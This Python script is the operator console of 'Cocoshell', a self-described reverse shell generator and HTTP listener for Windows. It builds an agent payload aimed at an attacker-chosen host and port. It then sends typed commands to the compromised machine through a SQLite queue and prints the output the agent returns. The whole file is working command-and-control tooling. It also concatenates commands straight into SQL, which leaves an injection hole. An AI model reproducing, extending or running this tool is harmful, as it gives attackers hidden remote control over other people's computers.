#!/usr/bin/env python
import subprocess, time, sqlite3, argparse, os, sys, random, string, requests, datetime
from os.path import exists
from core.payload import generate
from core.log import Log

parser = argparse.ArgumentParser(
    prog='Cocoshell',
    description='A reverse shell generator for windows and listener that uses http to establish a connection.',
    epilog='''
    tbd
    '''
)
parser.add_argument("-l", "--lhost", help="the ip the agent will connect to")
parser.add_argument("-p", "--lport", help="the port the agent will connect to (default: 5000)")
parser.add_argument("-f", "--frequency", help="the amount of seconds the agent waits for the next command (default: 1)")
parser.add_argument("-r", "--route", help="the api endpoint the agent will connect to")
parser.add_argument("-v", "--verbose", help="debug messages will be printed to the console", action="store_true")
parser.add_argument("-t", "--timeout", help="the amount of seconds after which a command is cancelled (default: 30)", type=int)
args, leftovers = parser.parse_known_args()

letters = string.ascii_lowercase
route = args.route if args.route is not None else ''.join(random.choice(letters) for i in range(8))

logger = Log(args.verbose)

if args.lhost is not None:
    lhost = args.lhost
else:
    logger.failed("please use -l/--lhost to specify the ip the agent will connect to")
    sys.exit(0)

lport = args.lport if args.lport is not None else '5000'
frequency = args.frequency if args.frequency is not None else 1
timeout_cmd = args.timeout + frequency if args.timeout is not None else 30 + frequency
timeout_agent = 60 + frequency

logger.debug("Cocoshell API starting")

api_url = 'http://0.0.0.0:' + lport
agent_url = 'http://' + lhost + ':' + lport + '/' + route

try:
    api_log = open("logs/cocoshell_api.log", "a+")
except FileNotFoundError:
    with open("logs/cocoshell_api.log", "a+") as f:
        f.write('')
    api_log = open("logs/cocoshell_api.log", "a+")

proc = subprocess.Popen(["python3", "core/api.py", "-r", route], stdout=api_log)
logger.info(f"Cocoshell API started on {api_url}")
logger.info(f"Agent will connect to {agent_url}")
logger.debug("Connecting to database")
time.sleep(2.0)
con = sqlite3.connect("cocoshell.db", check_same_thread=False)
cur = con.cursor()
logger.debug("Connected")
logger.payload(generate(agent_url, frequency))

waiting_for_result = False
result = None
prompt = "cocoshell"
pwd = ''

#############################################################################

def new_command(cmd):
    if get_last_result()[3] == 1:
        cur.execute("INSERT INTO commands (cmd, result, hasBeenRun) VALUES ('" + cmd + "', null, 0)")
        con.commit()
        logger.debug("Command send to agent")
    else:
        logger.failed("Still waiting for a result")
    return True # Always true as there is either a new command or we are still waiting for a result

def get_last_result():
    cur.execute("SELECT * FROM commands ORDER BY id DESC LIMIT 1")
    return cur.fetchone()

def not_implemented():
    logger.failed("This function is currently unavailable but will probably be implemented in the future")

def get_heartbeat():
    cur.execute("SELECT beat FROM pulse ORDER BY id DESC LIMIT 1")
    return cur.fetchone()[0]
    
def is_active():
    cur.execute("SELECT beat FROM pulse ORDER BY id DESC LIMIT 1")
    timestamp_str = cur.fetchone()[0]
    timestamp = datetime.datetime.strptime(timestamp_str, "%H:%M:%S %m/%d/%Y")
    difference = datetime.datetime.now() - timestamp
    active = True if difference.total_seconds() > timeout_agent else False
    return active

def command_has_timed_out(start):
    difference = datetime.datetime.now() - start
    timed_out = True if difference.total_seconds() > timeout_cmd else False
    return timed_out

def reset_agent():
    cur.execute("UPDATE commands SET hasBeenRun = 1")
    cur.execute("UPDATE pwd SET pwd = 'NULL'")

def cleanup():
    logger.debug("Cocoshell stopping")
    logger.debug("Cleaning up")
    reset_agent()
    con.commit()
    proc.terminate()
    con.close()
    logger.important("Cocoshell stopped")

#############################################################################

try:
    while (True):
        response = requests.get(agent_url + '/pwd')
        pwd = response.text

        if pwd == "NULL":
            time.sleep(1.0)
            continue
        if is_active():
            logger.warn("the agent seems to have timed out")

        command = input(f"*{prompt}* {pwd}> ").strip()
        command_start_time = datetime.datetime.now()

        if command == "exit":
            raise SystemExit
        if command == "":
            continue
        if command in ["cd ..", "cd .", "cd"]:
            logger.failed("you cannot use dots in the command")
            continue
        if command in ["pulse", "heartbeat", "beat"]:
            logger.info(f"Agent last checked in at {get_heartbeat()}")
            continue

        waiting_for_result = new_command(command)
        if (command == "help"):
            not_implemented()
            waiting_for_result = False
        if (command == "generate"):
            generate(agent_url)
            waiting_for_result = False
        if (command == "exit-agent"):
            waiting_for_result = False
            logger.warning("Telling the agent to quit")
        if ("set-frequency" in command):
            waiting_for_result = False
            frequency_array = command.split("set-frequency")
            frequency_seconds = frequency_array[1].strip()
            logger.info("Telling the agent to sleep for " + str(frequency_seconds) + " seconds between each request")
            time.sleep(int(frequency))
            frequency = frequency_seconds
            cur.execute("UPDATE commands SET hasBeenRun = 1")

        while (waiting_for_result):
            if command_has_timed_out(command_start_time):
                reset_agent()
                logger.failed("the command has timed out")
                logger.info("use the command 'pulse' to check when the agent last checked in")
                break
            if get_last_result()[3] == 1:
                waiting_for_result = False
                command_start_time = None
                result = get_last_result()
                if result[2]:
                    logger.debug("Received output from agent")
                    cleaned_result = result[2].replace('%NL%', os.linesep)
                    if cleaned_result != "True":
                        logger.message(cleaned_result)
                else:
                    logger.failed("No output for that command")
                    logger.failed("The command probably failed")
            else:
                time.sleep(0.5)
    
except KeyboardInterrupt:
    print("")
    logger.important("Ctrl+C detected")
    pass
except SystemExit:
    
    logger.debug("Exiting")
    pass
finally:
    cleanup()
